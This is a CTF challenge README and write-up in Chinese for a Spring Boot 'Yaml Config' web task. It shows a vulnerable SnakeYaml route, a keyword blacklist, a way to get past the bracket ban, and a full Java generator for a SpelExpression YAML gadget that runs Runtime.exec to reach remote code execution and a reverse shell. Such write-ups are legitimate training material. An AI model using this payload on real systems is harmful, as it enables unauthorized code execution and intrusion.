## 題目名稱
Yaml Config

## 題目類型
Web

## 題目說明
Parse yaml config with Spring Boot !

## 環境部署
使用 `docker` 文件夾下的東西部署。
```sh
# build
docker build -t yamlconfig:latest .
# run
docker run -p 8081:8080 -d yamlconfig:latest
```
環境內的 springboot 是跑在 8080 端口上的，同目錄下的 `attachment.zip` 是作為附件發給選手的。

## Write-Up
最近在看 SnakeYaml 這個包時找到的半條鏈子，為什麼說是半條呢，因為它沒發一步到位欸，但是感覺可以放到題目中搞一個 java 題於是就這麼弄咯。

打開附件可以是一個 docker 出網環境，看配置可以看出來需要 RCE。同時看到有一個 jar 包，使用一些工具反編譯后可以得到路由信息和依賴包。

下面這個路由發現能夠打 snakeyaml ，所以可以直接去找 snakeyaml 的鏈子。
```java
@PostMapping({"/config"})
@ResponseBody
public HashMap<String, String> config(String yaml) {
    HashMap<String, String> configMap = new HashMap<>();
    if (!Common.isValid(yaml) || yaml.isEmpty()) {
        yaml = Common.exampleConfig;
    }
    Yaml parse = new Yaml();
    Object config = parse.load(yaml);
    Method[] methods = config.getClass().getDeclaredMethods();
    for (Method method: methods) {
        String name = method.getName();
        if (name.startsWith("get")
                && method.getParameterCount() == 0
                && name.length() > 3) {
            name = name.substring(3);
            try {
                configMap.put(name, method.invoke(config).toString());
            } catch (Exception ignored) {}
        }
    }
    return configMap;
}
```

但是我這裡寫了一個黑名單，ban掉了 `[`，`]`，以及一些網絡上已經有的鏈子。

```java
public static boolean isValid(String origin) {
    if (origin.contains("[") || origin.contains("]") || origin.contains("ScriptEngineManager") || origin.contains("InputStream")
            || origin.contains("OutputStream") || origin.contains("JdbcRowSetImpl") || origin.contains("jndi")) {
        return false;
    }
    return true;
}
```

關於繞過`[`,`]`其實可以去看snakeyaml的源碼解析流程或者說去看看 yaml 協議格式，可以用下面這個形式來代替調用構造器：
```yaml
!!Class
  - "FieldA's value"
  - "FieldB's value"
  - "FieldC's value"
```

可以看到環境中並沒有給一些特別的依賴項，其實這也減少了選手搜索鏈的難度。

再來看看路由，它後續處理時會獲取這個對象所有的 `get(.*)` 方法并調用，如果對 Java 反序列化熟悉的話可以知道 SpringBoot 依賴項中默認引入了 `SpelExpression`，而它便需要通過 `getValue` 方法觸發。於是我們的任務就變成了用 yaml 的語法構造一個 `SpelExpression`，然後它會觸發 `getValue` 方法從而造成 rce。

具體怎麼構造有一個好辦法就是調試時輸出它 ast 的結構，然後跟著打一遍就行。

下面就是生成的 yaml 文件內容，然後將生成的內容直接發給 SpringBoot，反彈 shell 即可。（記住命令前後"\"的轉義）

```java
public String ELExpression(String cmd) {
    int length = cmd.length();
    return String.format(
            "!!org.springframework.expression.spel.standard.SpelExpression\n" +
            "  - \"T(java.lang.Runtime).getRuntime().exec(\\\"%s\\\")\"\n" +
            "  - !!org.springframework.expression.spel.ast.CompoundExpression\n" +
            "    - 0\n" +
            "    - 38\n" +
            "    -\n" +
            "      - !!org.springframework.expression.spel.ast.TypeReference\n" +
            "        - 0\n" +
            "        - 1\n" +
            "        - !!org.springframework.expression.spel.ast.QualifiedIdentifier\n" +
            "          - 2\n" +
            "          - 19\n" +
            "          -\n" +
            "            - !!org.springframework.expression.spel.ast.Identifier\n" +
            "              - \"java\"\n" +
            "              - 2\n" +
            "              - 6\n" +
            "            - !!org.springframework.expression.spel.ast.Identifier\n" +
            "              - \"lang\"\n" +
            "              - 7\n" +
            "              - 11\n" +
            "            - !!org.springframework.expression.spel.ast.Identifier\n" +
            "              - \"Runtime\"\n" +
            "              - 12\n" +
            "              - 19\n" +
            "      - !!org.springframework.expression.spel.ast.MethodReference\n" +
            "        - false\n" +
            "        - \"getRuntime\"\n" +
            "        - 21\n" +
            "        - 31\n" +
            "        -\n" +
            "      - !!org.springframework.expression.spel.ast.MethodReference\n" +
            "        - false\n" +
            "        - \"exec\"\n" +
            "        - 34\n" +
            "        - 38\n" +
            "        -\n" +
            "          - !!org.springframework.expression.spel.ast.StringLiteral\n" +
            "            - \"\\\"%s\\\"\"\n" +
            "            - 39\n" +
            "            - %d\n" +
            "            - \"\\\"%s\\\"\"\n" +
            "  - !!org.springframework.expression.spel.SpelParserConfiguration \n" +
            "    - false\n" +
            "    - false\n" , cmd, cmd, 41 + length, cmd);
}
```
